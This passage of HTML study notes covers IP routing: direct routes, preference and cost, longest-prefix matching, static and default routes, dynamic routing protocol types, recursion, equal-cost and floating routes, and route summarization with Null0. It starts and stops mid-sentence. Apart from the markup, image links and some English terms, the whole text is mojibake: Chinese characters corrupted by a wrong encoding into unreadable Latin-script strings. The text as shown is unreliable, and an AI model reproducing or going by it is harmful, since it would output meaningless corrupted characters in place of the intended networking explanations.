åˆ°çš„è·¯ç”±</p><p><strong>ç›´è¿è·¯ç”±</strong></p><p>ç›´è¿è·¯ç”±æŒ‡å‘æœ¬åœ°ç›´è¿ç½‘ç»œçš„è·¯ç”±ï¼Œç”±è®¾å¤‡è‡ªåŠ¨ç”Ÿæˆ</p><p>å½“è·¯ç”±å™¨ä¸ºè·¯ç”±è½¬å‘çš„æœ€åä¸€è·³è·¯ç”±å™¨æ—¶ï¼ŒIPæŠ¥æ–‡åŒ¹é…ç›´è¿è·¯ç”±ï¼Œè·¯ç”±å™¨è½¬å‘IPæŠ¥æ–‡åˆ°ç›®çš„ä¸»æœº</p><p>ä½¿ç”¨ç›´è¿è·¯ç”±è¿›è¡Œè·¯ç”±è½¬å‘æ—¶ï¼ŒæŠ¥æ–‡çš„ç›®çš„IPå’Œè·¯ç”±å™¨æ¥å£IPåœ¨ä¸€ä¸ªç½‘æ®µå†…</p><p>å½“åŒ¹é…ä¸­ç›´è¿è·¯ç”±è¿›è¡Œè½¬å‘æ—¶ï¼Œæ­¤æ—¶è·¯ç”±å™¨ä¼šæŸ¥çœ‹ARPè¡¨é¡¹ï¼Œå°†æŠ¥æ–‡ç›´æ¥è½¬åˆ°ç›®çš„åœ°å€ï¼Œæ­¤ æ—¶è¯¥è·¯ç”±å™¨ä¸ºè·¯ç”±è½¬å‘çš„æœ€åä¸€è·³è·¯ç”±å™¨ã€‚</p><p>ç›´è¿è·¯ç”±çš„ä¸‹ä¸€è·³åœ°å€å¹¶ä¸æ˜¯å…¶ä»–è®¾å¤‡ä¸Šçš„æ¥å£åœ°å€ï¼Œå› ä¸ºè¯¥è·¯ç”±çš„ç›®çš„ç½‘æ®µä¸ºæ¥å£æ‰€åœ¨ ç½‘æ®µï¼Œæœ¬æ¥å£å°±æ˜¯æœ€åä¸€è·³ï¼Œä¸éœ€è¦å†è½¬å‘ç»™ä¸‹ä¸€è·³ï¼Œæ‰€ä»¥åœ¨è·¯ç”±è¡¨ä¸­çš„ä¸‹ä¸€è·³åœ°å€å°±æ˜¯ æ¥å£è‡ªèº«åœ°å€ã€‚</p><p> ä½¿ç”¨ç›´è¿è·¯ç”±è¿›è¡Œè·¯ç”±è½¬å‘æ—¶ï¼Œè½¬å‘çš„åŠ¨ä½œä¸æ˜¯äº¤ç»™ä¸‹ä¸€è·³ï¼Œè€Œæ˜¯æŸ¥è¯¢ARPè¡¨é¡¹ï¼Œæ ¹æ®ARP è¡¨é¡¹å°è£…æŠ¥æ–‡ï¼Œå°†æŠ¥æ–‡å‘é€åˆ°ç›®çš„IPã€‚</p><p>å¹¶ä¸æ˜¯æ‰€æœ‰æ¥å£ç”Ÿæˆçš„ç›´è¿è·¯ç”±éƒ½ä¼šå‡ºç°åœ¨è·¯ç”±è¡¨ä¸­ï¼Œç›´è¿è·¯ç”±å‡ºç°åœ¨è·¯ç”±è¡¨ä¸­çš„å‰ææ˜¯è¯¥æ¥å£çš„ç‰©ç†çŠ¶æ€ã€åè®®çŠ¶æ€éƒ½ä¸ºup</p><h3 id="æœ€ä¼˜è·¯ç”±æ¡ç›®ä¼˜é€‰"><a href="#æœ€ä¼˜è·¯ç”±æ¡ç›®ä¼˜é€‰" class="headerlink" title="æœ€ä¼˜è·¯ç”±æ¡ç›®ä¼˜é€‰"></a>æœ€ä¼˜è·¯ç”±æ¡ç›®ä¼˜é€‰</h3><p>ipè·¯ç”±è¡¨ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206224832828.png" alt="image-20220206224832828"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206224847226.png" alt="image-20220206224847226"></p><p>Preferenceç”¨äºä¸åŒè·¯ç”±åè®®é—´è·¯ç”±ä¼˜å…ˆçº§çš„æ¯”è¾ƒï¼ŒCostç”¨äºåŒä¸€ç§è·¯ç”±åè®®å†…éƒ¨ä¸åŒè·¯ç”±çš„ä¼˜å…ˆçº§çš„æ¯”è¾ƒã€‚åœ¨ä¸šç•Œï¼ŒCostä¹Ÿè¢«ç§°ä¸º<strong>è·¯ç”±åº¦é‡å€¼</strong>ï¼ˆMetricï¼‰ã€‚</p><p><strong>è·¯ç”±ä¼˜å…ˆçº§ - å¸¸è§é»˜è®¤å€¼</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206230417214.png" alt="image-20220206230417214"></p><p>ä¼˜å…ˆçº§å€¼ï¼ˆPreferenceï¼‰è¶Šå°ä»£è¡¨åŠ å…¥è·¯ç”±è¡¨çš„ä¼˜å…ˆçº§è¶Šé«˜</p><p>æ‹¥æœ‰æœ€é«˜ä¼˜å…ˆçº§çš„è·¯ç”±å°†è¢«æ·»åŠ è¿›è·¯ç”±è¡¨</p><p><strong>åº¦é‡å€¼ (cost)- åŸºæœ¬æ¦‚å¿µ</strong></p><p>å½“è·¯ç”±å™¨é€šè¿‡æŸç§åè®®å‘ç°äº†å¤šæ¡åˆ°è¾¾åŒä¸€ä¸ªç›®çš„ç½‘ç»œçš„è·¯ç”±æ—¶(æ‹¥æœ‰ç›¸åŒçš„è·¯ç”±ä¼˜å…ˆçº§)ï¼Œåº¦é‡å€¼å°†ä½œä¸ºè·¯ç”±ä¼˜é€‰çš„ä¾æ®ä¹‹ä¸€ã€‚</p><p>è·¯ç”±åº¦é‡å€¼è¡¨ç¤ºåˆ°è¾¾è¿™æ¡è·¯ç”±æ‰€æŒ‡ç›®çš„åœ°å€çš„ä»£ä»·ã€‚</p><p>ä¸€äº›å¸¸ç”¨çš„åº¦é‡å€¼æœ‰ï¼šè·³æ•°ã€å¸¦å®½ã€æ—¶å»¶ã€ä»£ä»·ã€è´Ÿè½½ã€å¯é æ€§ç­‰</p><p>åº¦é‡æ•°å€¼è¶Šå°è¶Šä¼˜å…ˆï¼Œåº¦é‡å€¼æœ€å°è·¯ç”±å°†ä¼šè¢«æ·»åŠ åˆ°è·¯ç”±è¡¨ä¸­</p><h3 id="è·¯ç”±è½¬å‘"><a href="#è·¯ç”±è½¬å‘" class="headerlink" title="è·¯ç”±è½¬å‘"></a>è·¯ç”±è½¬å‘</h3><h4 id="æœ€é•¿åŒ¹é…åŸåˆ™"><a href="#æœ€é•¿åŒ¹é…åŸåˆ™" class="headerlink" title="æœ€é•¿åŒ¹é…åŸåˆ™"></a>æœ€é•¿åŒ¹é…åŸåˆ™</h4><p>å½“è·¯ç”±å™¨æ”¶åˆ°ä¸€ä¸ªIPæ•°æ®åŒ…æ—¶ï¼Œä¼šå°†æ•°æ®åŒ…çš„ç›®çš„IPåœ°å€ä¸è‡ªå·±æœ¬åœ°è·¯ç”±è¡¨ä¸­çš„æ‰€æœ‰è·¯ç”±è¡¨é¡¹è¿›è¡Œé€ä½æ¯”å¯¹ï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…åº¦æœ€é•¿çš„æ¡ç›®ï¼Œè¿™å°±æ˜¯æœ€é•¿å‰ç¼€åŒ¹é…æœºåˆ¶ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206231244641.png" alt="image-20220206231244641"></p><p><strong>ç¤ºä¾‹ï¼š</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206231409791.png" alt="image-20220206231409791"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206231416129.png" alt="image-20220206231416129"></p><h4 id="è·¯ç”±è½¬å‘æµç¨‹"><a href="#è·¯ç”±è½¬å‘æµç¨‹" class="headerlink" title="è·¯ç”±è½¬å‘æµç¨‹"></a>è·¯ç”±è½¬å‘æµç¨‹</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206231523631.png" alt="image-20220206231523631"></p><p>æ¥è‡ª10.0.1.0/24ç½‘æ®µçš„IPæŠ¥æ–‡æƒ³è¦å»å¾€40.0.1.0/24ç½‘æ®µï¼Œé¦–å…ˆåˆ°è¾¾ç½‘å…³ï¼Œç½‘å…³æŸ¥æ‰¾è·¯ç”±è¡¨é¡¹ï¼Œ ç¡®å®šè½¬å‘çš„ä¸‹ä¸€è·³ã€å‡ºæ¥å£ï¼Œä¹‹åæŠ¥æ–‡è½¬å‘ç»™R2ã€‚æŠ¥æ–‡åˆ°è¾¾R2ä¹‹åï¼ŒR2é€šè¿‡æŸ¥æ‰¾è·¯ç”±è¡¨é¡¹è½¬å‘ç»™R3ï¼ŒR3æ”¶åˆ°åæŸ¥æ‰¾è·¯ç”±è¡¨é¡¹ï¼Œå‘ç°IPæŠ¥æ–‡ç›®çš„IPå±äºæœ¬åœ°æ¥å£æ‰€åœ¨ç½‘æ®µï¼Œç›´æ¥æœ¬åœ°è½¬å‘ã€‚</p><h2 id="é™æ€è·¯ç”±"><a href="#é™æ€è·¯ç”±" class="headerlink" title="é™æ€è·¯ç”±"></a>é™æ€è·¯ç”±</h2><h3 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h3><p>é™æ€è·¯ç”±ç”±ç½‘ç»œç®¡ç†å‘˜æ‰‹åŠ¨é…ç½®ï¼Œé…ç½®æ–¹ä¾¿ï¼Œå¯¹ç³»ç»Ÿè¦æ±‚ä½ï¼Œé€‚ç”¨äºæ‹“æ‰‘ç»“æ„ç®€å•å¹¶ä¸”ç¨³å®šçš„å°å‹ç½‘ç»œ</p><p>ç¼ºç‚¹æ˜¯ä¸èƒ½è‡ªåŠ¨é€‚åº”ç½‘ç»œæ‹“æ‰‘çš„å˜åŒ–ï¼Œéœ€è¦äººå·¥å¹²é¢„ã€‚</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206234934320.png" alt="image-20220206234934320"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206234942785.png" alt="image-20220206234942785"></p><h3 id="ç¼ºçœè·¯ç”±"><a href="#ç¼ºçœè·¯ç”±" class="headerlink" title="ç¼ºçœè·¯ç”±"></a>ç¼ºçœè·¯ç”±</h3><p>ç¼ºçœè·¯ç”±æ˜¯ä¸€ç§ç‰¹æ®Šçš„è·¯ç”±ï¼Œå½“æŠ¥æ–‡æ²¡æœ‰åœ¨è·¯ç”±è¡¨ä¸­æ‰¾åˆ°åŒ¹é…çš„å…·ä½“è·¯ç”±è¡¨é¡¹æ—¶æ‰ä½¿ç”¨çš„è·¯ç”±ã€‚å¦‚æœæŠ¥æ–‡çš„ç›®çš„åœ°å€ä¸èƒ½ä¸è·¯ç”±è¡¨çš„ä»»ä½•ç›®çš„åœ°å€ç›¸åŒ¹é…ï¼Œé‚£ä¹ˆè¯¥æŠ¥æ–‡å°†é€‰å–ç¼ºçœè·¯ç”±è¿›è¡Œè½¬å‘</p><p>ç¼ºçœè·¯ç”±åœ¨è·¯ç”±è¡¨ä¸­çš„å½¢å¼ä¸º0.0.0.0/0ï¼Œç¼ºçœè·¯ç”±ä¹Ÿå«åšé»˜è®¤è·¯ç”±</p><p>ç¼ºçœè·¯ç”±ä¸€èˆ¬ç”¨äºä¼ä¸šç½‘ç»œå‡ºå£ï¼Œé…ç½®ä¸€æ¡ç¼ºçœè·¯ç”±è®©å‡ºå£è®¾å¤‡èƒ½å¤Ÿè½¬å‘å‰å¾€internetä¸Šä»»æ„åœ°å€çš„ipæŠ¥æ–‡ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220206235235695.png" alt="image-20220206235235695"></p><h2 id="åŠ¨æ€è·¯ç”±"><a href="#åŠ¨æ€è·¯ç”±" class="headerlink" title="åŠ¨æ€è·¯ç”±"></a>åŠ¨æ€è·¯ç”±</h2><p>å½“ç½‘ç»œè§„æ¨¡è¶Šæ¥è¶Šå¤§æ—¶ï¼Œä½¿ç”¨æ‰‹åŠ¨é…ç½®é™æ€è·¯ç”±çš„æ–¹å¼è·å–è·¯ç”±æ¡ç›®å°†å˜å¾—è¶Šå‘å¤æ‚ï¼ŒåŒæ—¶åœ¨æ‹“æ‰‘å‘ç”Ÿå˜åŒ–æ—¶ä¸èƒ½åŠæ—¶ã€çµæ´»å“åº”</p><p> åŠ¨æ€è·¯ç”±åè®®æœ‰è‡ªå·±çš„è·¯ç”±ç®—æ³•ï¼Œèƒ½å¤Ÿè‡ªåŠ¨é€‚åº”ç½‘ç»œæ‹“æ‰‘çš„å˜åŒ–ï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘ç®¡ç†äººå‘˜çš„å·¥ä½œé‡ï¼Œé€‚ç”¨äºå…·æœ‰ä¸€å®šæ•°é‡ä¸‰å±‚è®¾å¤‡çš„ç½‘ç»œã€‚</p><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p>æ ¹æ®è·¯ç”±ä¿¡æ¯ä¼ é€’çš„å†…å®¹ã€è®¡ç®—è·¯ç”±çš„ç®—æ³•ï¼Œå¯ä»¥å°†åŠ¨æ€è·¯ç”±åè®®åˆ†ä¸ºä¸¤å¤§ç±»</p><ul><li> è·ç¦»çŸ¢é‡åè®®ï¼ˆDistance-Vector Protocolï¼‰</li><li>RIP</li><li>é“¾è·¯çŠ¶æ€åè®®ï¼ˆLink-State Protocolï¼‰<ul><li>OSPF</li><li>IS-IS</li></ul></li><li>BGPä½¿ç”¨ä¸€ç§åŸºäºè·ç¦»çŸ¢é‡ç®—æ³•ä¿®æ”¹åçš„ç®—æ³•ï¼Œè¯¥ç®—æ³•è¢«ç§°ä¸ºè·¯å¾„çŸ¢é‡ï¼ˆPath Vectorï¼‰ ç®—æ³•ã€‚å› æ­¤åœ¨æŸäº›åœºåˆä¸‹ï¼ŒBGPä¹Ÿè¢«ç§°ä¸ºè·¯å¾„çŸ¢é‡è·¯ç”±åè®®ã€‚</li></ul><p>æ ¹æ®å·¥ä½œèŒƒå›´ä¸åŒï¼Œåˆå¯ä»¥åˆ†ä¸º</p><ul><li>å†…éƒ¨ç½‘å…³åè®®IGPï¼ˆInterior Gateway Protocolï¼‰:åœ¨ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿå†…éƒ¨è¿è¡Œã€‚RIPã€ OSPFã€ISISä¸ºå¸¸è§çš„IGPåè®®ã€‚</li><li> å¤–éƒ¨ç½‘å…³åè®®EGPï¼ˆExterior Gateway Protocolï¼‰ï¼šè¿è¡Œäºä¸åŒè‡ªæ²»ç³»ç»Ÿä¹‹é—´ã€‚BGP æ˜¯ç›®å‰æœ€å¸¸ç”¨çš„EGPåè®®ã€‚</li></ul><h2 id="è·¯ç”±é«˜çº§ç‰¹æ€§"><a href="#è·¯ç”±é«˜çº§ç‰¹æ€§" class="headerlink" title="è·¯ç”±é«˜çº§ç‰¹æ€§"></a>è·¯ç”±é«˜çº§ç‰¹æ€§</h2><h3 id="è·¯ç”±é€’å½’"><a href="#è·¯ç”±é€’å½’" class="headerlink" title="è·¯ç”±é€’å½’"></a>è·¯ç”±é€’å½’</h3><p>è·¯ç”±å¿…é¡»æœ‰ç›´è¿çš„ä¸‹ä¸€è·³æ‰èƒ½å¤ŸæŒ‡å¯¼è½¬å‘ï¼Œä½†æ˜¯è·¯ç”±ç”Ÿæˆæ—¶ä¸‹ä¸€è·³å¯èƒ½ä¸æ˜¯ç›´è¿çš„ï¼Œå› æ­¤éœ€è¦è®¡ç®—å‡ºä¸€ä¸ªç›´è¿çš„ä¸‹ä¸€è·³å’Œå¯¹åº”çš„å‡ºæ¥å£ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšè·¯ç”±é€’å½’ï¼Œä¹Ÿè¢«ç§°ä¸ºè·¯ç”±è¿­ä»£ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220207173411303.png" alt="image-20220207173411303"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220207173455073.png" alt="image-20220207173455073"></p><h3 id="ç­‰ä»·è·¯ç”±"><a href="#ç­‰ä»·è·¯ç”±" class="headerlink" title="ç­‰ä»·è·¯ç”±"></a>ç­‰ä»·è·¯ç”±</h3><p>è·¯ç”±è¡¨ä¸­å­˜åœ¨ç­‰ä»·è·¯ç”±ä¹‹åï¼Œå‰å¾€è¯¥ç›®çš„ç½‘æ®µçš„IPæŠ¥æ–‡è·¯ç”±å™¨ä¼šé€šè¿‡æ‰€æœ‰æœ‰æ•ˆçš„æ¥å£ã€ä¸‹ä¸€è·³è½¬å‘ï¼Œè¿™ç§è½¬å‘è¡Œä¸ºè¢«ç§°ä¸ºè´Ÿè½½åˆ†æ‹…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220207174156599.png" alt="image-20220207174156599"></p><h3 id="æµ®åŠ¨è·¯ç”±"><a href="#æµ®åŠ¨è·¯ç”±" class="headerlink" title="æµ®åŠ¨è·¯ç”±"></a>æµ®åŠ¨è·¯ç”±</h3><p>é™æ€è·¯ç”±æ”¯æŒé…ç½®æ—¶æ‰‹åŠ¨æŒ‡å®šä¼˜å…ˆçº§ï¼Œå¯ä»¥é€šè¿‡é…ç½®ç›®çš„åœ°å€/æ©ç ç›¸åŒã€ä¼˜å…ˆçº§ä¸åŒã€ä¸‹ä¸€è·³ä¸åŒçš„é™æ€è·¯ç”±ï¼Œå®ç°è½¬å‘è·¯å¾„çš„å¤‡ä»½ã€‚</p><p>æµ®åŠ¨è·¯ç”±æ˜¯ä¸»ç”¨è·¯ç”±çš„å¤‡ä»½ï¼Œä¿è¯é“¾è·¯æ•…éšœæ—¶æä¾›å¤‡ä»½è·¯ç”±ã€‚ä¸»ç”¨è·¯ç”±ä¸‹ä¸€è·³å¯è¾¾æ—¶è¯¥å¤‡ä»½è·¯ç”±ä¸ä¼šå‡ºç°åœ¨è·¯ç”±è¡¨ä¸­</p><p><strong>ç¤ºä¾‹</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220207174423411.png" alt="image-20220207174423411"></p><p> RTA-RTBä¹‹é—´çš„é“¾è·¯æ­£å¸¸æ—¶ï¼Œ20.0.0.0/30çš„ä¸¤æ¡è·¯ç”±æ¡ç›®éƒ½æ˜¯æœ‰æ•ˆçš„æ¡ç›®ï¼Œæ­¤æ—¶æ¯”è¾ƒä¼˜å…ˆ çº§ï¼Œä¸‹ä¸€è·³ä¸º10.1.1.2çš„ä¼˜å…ˆçº§60ï¼Œä¸‹ä¸€è·³ä¸º10.1.2.2çš„ä¼˜å…ˆçº§70ï¼Œå› æ­¤ä¸‹ä¸€è·³ä¸º10.1.1.2çš„ åŠ å…¥è·¯ç”±è¡¨ã€‚</p><p>RTA-RTBä¹‹é—´çš„é“¾è·¯æ•…éšœæ—¶ï¼Œ10.1.1.2ä¸å¯è¾¾ï¼Œå› æ­¤ä¸‹ä¸€è·³ä¸º10.1.1.2çš„è·¯ç”±å¤±æ•ˆï¼Œæ­¤æ—¶å‰ å¾€20.0.0.0/30çš„è·¯ç”±å°±åªå­˜åœ¨ä¸€æ¡ï¼Œè¯¥æ¡è·¯ç”±å°†ä¼šè¢«é€‰å…¥è·¯ç”±è¡¨ã€‚å‰å¾€20.0.0.1çš„æµé‡å°†ä¼š è¢«è½¬å‘åˆ°10.1.2.2</p><h3 id="è·¯ç”±æ±‡æ€»"><a href="#è·¯ç”±æ±‡æ€»" class="headerlink" title="è·¯ç”±æ±‡æ€»"></a>è·¯ç”±æ±‡æ€»</h3><h4 id="CIDR-æ— ç±»åˆ«åŸŸé—´è·¯ç”±"><a href="#CIDR-æ— ç±»åˆ«åŸŸé—´è·¯ç”±" class="headerlink" title="CIDR(æ— ç±»åˆ«åŸŸé—´è·¯ç”±)"></a>CIDR(æ— ç±»åˆ«åŸŸé—´è·¯ç”±)</h4><p>é‡‡ç”¨ipåœ°å€åŠ æ©ç é•¿åº¦æ¥æ ‡è¯†ç½‘ç»œå’Œå­ç½‘ï¼Œè€Œä¸æ˜¯æŒ‰ç…§ç©¿é€çš„Aã€Bã€Cç­‰ç±»å‹å¯¹ç½‘ç»œåœ°å€è¿›è¡Œåˆ’åˆ†</p><p>CIDRå®¹è®¸ä»»æ„é•¿åº¦çš„æ©ç é•¿åº¦ï¼Œå°†ipåœ°å€çœ‹å‡ºè¿ç»­çš„åœ°å€ç©ºé—´ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„é•¿åº¦çš„å‰ç¼€åˆ†é…ï¼Œå¤šä¸ªè¿ç»­çš„å‰ç¼€å¯ä»¥èšåˆæˆä¸€ä¸ªç½‘ç»œï¼Œè¯¥ç‰¹æ€§å¯ä»¥æœ‰æ•ˆå‡å°‘è·¯ç”±è¡¨æ¡ç›®æ•°é‡</p><h4 id="è·¯ç”±æ±‡æ€»éœ€æ±‚"><a href="#è·¯ç”±æ±‡æ€»éœ€æ±‚" class="headerlink" title="è·¯ç”±æ±‡æ€»éœ€æ±‚"></a>è·¯ç”±æ±‡æ€»éœ€æ±‚</h4><p>å­ç½‘åˆ’åˆ†ã€VLSMè§£å†³äº†åœ°å€ç©ºé—´æµªè´¹çš„é—®é¢˜ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†æ–°çš„é—®é¢˜ï¼šè·¯ç”±è¡¨ä¸­çš„è·¯ç”±æ¡ç›®æ•°é‡å¢åŠ ã€‚</p><p>ä¸ºå‡å°‘è·¯ç”±æ¡ç›®æ•°é‡å¯ä»¥ä½¿ç”¨è·¯ç”±æ±‡æ€»</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220213164244240.png" alt="image-20220213164244240"></p><p>å¯¹äºä¸€ä¸ªå¤§è§„æ¨¡çš„ç½‘ç»œæ¥è¯´ï¼Œè·¯ç”±å™¨æˆ–å…¶ä»–å…·å¤‡è·¯ç”±åŠŸèƒ½çš„è®¾å¤‡åŠ¿å¿…éœ€è¦ç»´æŠ¤å¤§é‡çš„è·¯ç”±è¡¨é¡¹ï¼Œä¸ºäº†ç»´æŠ¤è‡ƒè‚¿çš„è·¯ç”±è¡¨ï¼Œè¿™äº›è®¾å¤‡å°±ä¸å¾—ä¸è€—è´¹å¤§é‡çš„èµ„æºã€‚åŒæ—¶ï¼Œç”±äºè·¯ç”±è¡¨çš„è§„æ¨¡å˜å¤§ï¼Œä¼šå¯¼è‡´è·¯ç”±å™¨åœ¨æŸ¥è¡¨è½¬å‘æ—¶æ•ˆç‡é™ä½ã€‚å› æ­¤åœ¨<strong>ä¿è¯ç½‘ç»œä¸­çš„è·¯ç”±å™¨åˆ°å„ç½‘æ®µéƒ½å…·å¤‡IPå¯è¾¾æ€§çš„åŒæ—¶ï¼Œéœ€è¦å‡å°è®¾å¤‡çš„è·¯ç”±è¡¨è§„æ¨¡</strong>ã€‚ä¸€ä¸ªç½‘ç»œå¦‚æœå…·å¤‡ç§‘å­¦çš„IPç¼–å€ï¼Œå¹¶ä¸”è¿›è¡Œåˆç†çš„è§„åˆ’ï¼Œæ˜¯å¯ä»¥åˆ©ç”¨å¤šç§æ‰‹æ®µå‡å°è®¾å¤‡è·¯ç”±è¡¨è§„æ¨¡çš„ã€‚ä¸€ä¸ªéå¸¸å¸¸è§è€Œåˆæœ‰æ•ˆçš„åŠæ³•å°±æ˜¯ä½¿ç”¨è·¯ç”±æ±‡æ€»ï¼ˆRoute Summarizationï¼‰ã€‚è·¯ç”±æ±‡æ€»åˆè¢«ç§°ä¸ºè·¯ç”±èšåˆï¼ˆRoute  Aggregationï¼‰ï¼Œæ˜¯<strong>å°†ä¸€ç»„æœ‰è§„å¾‹çš„è·¯ç”±æ±‡èšæˆä¸€æ¡è·¯ç”±ï¼Œä»è€Œè¾¾åˆ°å‡å°è·¯ç”±è¡¨è§„æ¨¡ä»¥åŠä¼˜ åŒ–è®¾å¤‡èµ„æºåˆ©ç”¨ç‡çš„ç›®çš„</strong>ï¼Œæˆ‘ä»¬æŠŠæ±‡èšä¹‹å‰çš„è¿™ç»„è·¯ç”±ç§°ä¸ºç²¾ç»†è·¯ç”±æˆ–æ˜ç»†è·¯ç”±ï¼ŒæŠŠæ±‡èš ä¹‹åçš„è¿™æ¡è·¯ç”±ç§°ä¸ºæ±‡æ€»è·¯ç”±æˆ–èšåˆè·¯ç”±</p><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220213164554367.png" alt="image-20220213164554367"></p><p> RTAä¸Šä¸ºäº†èƒ½å¤Ÿå‰å¾€è¿œç«¯åœ°å€ï¼Œéœ€è¦ä¸ºæ¯ä¸€ä¸ªè¿œç«¯ç½‘æ®µé…ç½®ä¸€æ¡æ˜ç»†è·¯ç”±ã€‚å»å¾€10.1.1.0/24ã€10.1.2.0/24ã€10.1.3.0/24â€¦æ‹¥æœ‰ç›¸åŒä¸‹ä¸€è·³ã€‚å°†æ‹¥æœ‰ç›¸åŒä¸‹ä¸€è·³ï¼Œä¸€ç»„æœ‰è§„å¾‹çš„è·¯ç”±æ±‡æ€»æˆ ä¸€æ¡è·¯ç”±ï¼Œè¿™å«åšè·¯ç”±æ±‡æ€»ã€‚</p><h4 id="è®¡ç®—"><a href="#è®¡ç®—" class="headerlink" title="è®¡ç®—"></a>è®¡ç®—</h4><p>å°†æ˜ç»†è·¯ç”±çš„ç›®çš„ç½‘ç»œéƒ½æ¢ç®—æˆäºŒè¿›åˆ¶ï¼Œç„¶åæ’åˆ—èµ·æ¥ï¼Œæ‰¾å‡ºæ‰€æœ‰ç›®çš„ç½‘ç»œåœ°å€ä¸­&quot;ç›¸åŒçš„æ¯”ç‰¹ä½&quot;</p><h4 id="æ±‡æ€»å¼•å‘çš„é—®é¢˜"><a href="#æ±‡æ€»å¼•å‘çš„é—®é¢˜" class="headerlink" title="æ±‡æ€»å¼•å‘çš„é—®é¢˜"></a>æ±‡æ€»å¼•å‘çš„é—®é¢˜</h4><p>è·¯ç”±æ±‡æ€»ä¼šé€ æˆç¯è·¯é—®é¢˜</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220213165436927.png" alt="image-20220213165436927"></p><p>è§£å†³æ–¹æ³•ï¼š</p><p>åœ¨RTBä¸Šå¢åŠ ä¸€æ¡æŒ‡å‘NULL0çš„è·¯ç”±</p><p>ä¸€èˆ¬æ¥è¯´ä¸€æ¡è·¯ç”±ï¼Œæ— è®ºæ˜¯é™æ€çš„æˆ–è€…æ˜¯åŠ¨æ€çš„ï¼Œéƒ½éœ€è¦å…³è”åˆ°ä¸€ä¸ªå‡ºæ¥å£ï¼Œè·¯ç”±çš„å‡ºæ¥å£æŒ‡çš„æ˜¯è®¾å¤‡è¦åˆ°è¾¾ä¸€ä¸ªç›®çš„ç½‘ç»œæ—¶çš„å‡ºç«™æ¥å£ã€‚è·¯ç”±çš„å‡ºæ¥å£å¯ä»¥æ˜¯è¯¥è®¾å¤‡çš„ç‰©ç†æ¥å£ï¼Œ ä¾‹å¦‚ç™¾å…†ã€åƒå…†ä»¥å¤ªç½‘æ¥å£ï¼Œä¹Ÿå¯ä»¥æ˜¯é€»è¾‘æ¥å£ï¼Œä¾‹å¦‚VLANæ¥å£ï¼ˆVLAN Interfaceï¼‰ï¼Œæˆ–è€…éš§é“ï¼ˆTunnelï¼‰æ¥å£ç­‰ã€‚åœ¨ä¼—å¤šç±»å‹çš„å‡ºæ¥å£ä¸­ï¼Œæœ‰ä¸€ç§æ¥å£éå¸¸ç‰¹æ®Šï¼Œé‚£å°±æ˜¯Null ï¼ˆæ— æ•ˆï¼‰æ¥å£ï¼Œè¿™ç§ç±»å‹çš„æ¥å£åªæœ‰ä¸€ä¸ªç¼–å·ï¼Œä¹Ÿå°±æ˜¯0ã€‚Null0æ˜¯ä¸€ä¸ªç³»ç»Ÿä¿ç•™çš„é€»è¾‘æ¥ å£ï¼Œå½“ç½‘ç»œè®¾å¤‡åœ¨è½¬å‘æŸäº›æ•°æ®åŒ…æ—¶ï¼Œå¦‚æœä½¿ç”¨å‡ºæ¥å£ä¸ºNull0çš„è·¯ç”±ï¼Œé‚£ä¹ˆè¿™äº›æŠ¥æ–‡å°†è¢« 